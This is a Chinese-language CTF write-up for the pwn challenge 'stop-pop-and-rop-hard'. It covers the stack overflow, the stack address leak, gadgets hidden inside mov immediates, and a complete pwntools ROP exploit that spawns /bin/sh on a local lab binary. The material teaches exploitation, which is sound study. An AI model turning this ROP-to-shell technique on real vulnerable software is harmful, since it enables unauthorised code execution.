# stop-pop-and-rop-hard 题解

## 1. 题目信息

- 文件名：`stop-pop-and-rop-hard`
- 架构：x86-64，动态链接，未 strip
- 安全机制：

| 防护 | 状态 |
|---|---|
| PIE | 关闭（基址 `0x400000`） |
| Canary | 无 |
| NX | 开启 |
| RELRO | Partial |
| SHSTK / IBT | 二进制带 CET property note（运行时通常不强制） |

## 2. 程序分析

### 2.1 主流程

`main` 调用 `challenge`，`challenge` 是整个漏洞的入口：

```
challenge:
    push rbp
    mov  rbp, rsp
    sub  rsp, 0x50
    ...
    lea  rax, [rbp-0x30]        ; 缓冲区在 rbp-0x30
    printf("[LEAK] ... %p.", rax)  ; 泄露出栈地址
    read(0, rbp-0x30, 0x1000)   ; 读取 0x1000 字节 -> 栈溢出
    puts("Leaving!")
    leave; ret
```

- 缓冲区距返回地址：`0x30 + 0x8 = 0x38 = 56` 字节
- 输入上限 `0x1000`，足够放任意长度的 ROP 链
- `%p` 直接打印缓冲区地址，绕过 ASLR（栈地址泄露）

### 2.2 free_gadgets —— gadget 藏在立即数里

`free_gadgets` 函数本身不做任何有意义的跳转，但它把一组 ROP gadget 的**原始字节码**以 `movq $imm, -N(%rbp)` 的**立即数**形式写进了 `.text`：

```
40167c: 48 c7 45 f8 41 59 c3 00   movq $0xc35941, -8(%rbp)
401684: 48 c7 45 f0 5f c3 00 00   movq $0xc35f,   -16(%rbp)
40168c: 48 c7 45 e8 0f 05 c3 00   movq $0xc3050f, -24(%rbp)
401694: 48 c7 45 e0 41 58 c3 00   movq $0xc35841, -32(%rbp)
40169c: 48 c7 45 d8 5e c3 00 00   movq $0xc35e,   -40(%rbp)
4016a4: 48 c7 45 d0 58 c3 00 00   movq $0xc358,   -48(%rbp)
4016ac: 48 c7 45 c8 41 5a c3 00   movq $0xc35a41, -56(%rbp)
4016b4: 48 c7 45 c0 5a c3 00 00   movq $0xc35a,   -64(%rbp)
```

由于 x86 是不定长指令，**跳到这些 mov 指令的立即数中间**，CPU 会把立即数按新起点解码成真正的指令。这就是题目名字 `stop-pop` 的由来：pop gadget 不在常规位置，而是"藏"在数据里，需要"释放"（free）出来。

从 `xxd` 字节和 ROPgadget 双向验证，可用的完整 syscall ROP 套装：

| 地址 | 字节 | 指令 |
|---|---|---|
| `0x401680` | `41 59 c3` | `pop r9 ; ret` |
| `0x401688` | `5f c3` | `pop rdi ; ret` |
| `0x401690` | `0f 05 c3` | `syscall ; ret` |
| `0x401698` | `41 58 c3` | `pop r8 ; ret` |
| `0x4016a0` | `5e c3` | `pop rsi ; ret` |
| `0x4016a8` | `58 c3` | `pop rax ; ret` |
| `0x4016b0` | `41 5a c3` | `pop r10 ; ret` |
| `0x4016b8` | `5a c3` | `pop rdx ; ret` |
| `0x40101a` | `c3` | `ret` |

## 3. 解题思路

1. **信息收集**：接收 `%p` 泄漏的缓冲区地址 `buf`
2. **构造 payload**：`/bin/sh\0` 放在 payload 开头，`rdi` 指向该地址
3. **ROP 链**：用 `pop rax/rdi/rsi/rdx` + `syscall` 发起 `execve("/bin/sh", 0, 0)`

```
+------------------+-------------------------------------+
| /bin/sh\0        | 56 字节 padding 到返回地址             |
|  + 0x38 填充     |                                     |
+------------------+-------------------------------------+
| pop rax; ret     | 59   (SYS_execve)                   |
| pop rdi; ret     | buf  (指向 "/bin/sh")               |
| pop rsi; ret     | 0                                    |
| pop rdx; ret     | 0                                    |
| syscall; ret     |                                     |
+------------------+-------------------------------------+
```

## 4. 关于 CET（SHSTK / IBT）

二进制通过 `.note.gnu.property` 标记了 IBT + SHSTK，`checksec` 因此显示 Enabled。但在 CTF 运行环境中：

- **IBT** 只约束间接跳转/调用的目标必须是 `endbr64`，纯 `ret` ROP 链不涉及间接跳转，不受影响；
- **SHSTK** 若被内核强制启用，每次 `ret` 都会拿弹出的返回地址与影子栈比对，任何 ret 式 ROP 都会触发 `#CP`。题目既然以 ROP 为目标，说明远程环境并未强制启用（glibc/内核默认关闭，需显式配置才生效）。

因此标准 ROP 方案可直接生效。

## 5. 最终 Exploit

```python
from pwn import *

context.binary = '/challenge/stop-pop-and-rop-hard'
context.log_level = 'debug'

p = process('/challenge/stop-pop-and-rop-hard')

p.recvuntil(b'located at: ')
buf_addr = int(p.recvline().strip().rstrip(b'.'), 16)
log.success(f'buffer @ {hex(buf_addr)}')

pop_rax = 0x4016a8
pop_rdi = 0x401688
pop_rsi = 0x4016a0
pop_rdx = 0x4016b8
syscall = 0x401690

offset = 0x38

payload = b'/bin/sh\x00'
payload = payload.ljust(offset, b'A')
payload += p64(pop_rax) + p64(59)       # execve
payload += p64(pop_rdi) + p64(buf_addr) # "/bin/sh"
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)

p.send(payload)
p.interactive()
```

### 易错点

1. 泄漏地址行格式是 `...0x7ffdxxxx.\n`，结尾有一个句点 `.`，解析时必须 `rstrip(b'.')`；
2. 正确调用链是 `int(line.strip().rstrip(b'.'), 16)`，不要把 `rstrip` 误写成 `int()` 的第二参数；
3. 偏移是 `0x38`（48 字节缓冲 + 8 字节 saved rbp），不是 0x30。

## 6. 运行结果

```
[+] Starting local process '/challenge/stop-pop-and-rop-hard' : pid xxx
[DEBUG] Received ... b'[LEAK] Your input buffer is located at: 0x7ffc.....\n'
[+] buffer @ 0x7ffc17500ce0
[*] Switching to interactive mode
$ id
```
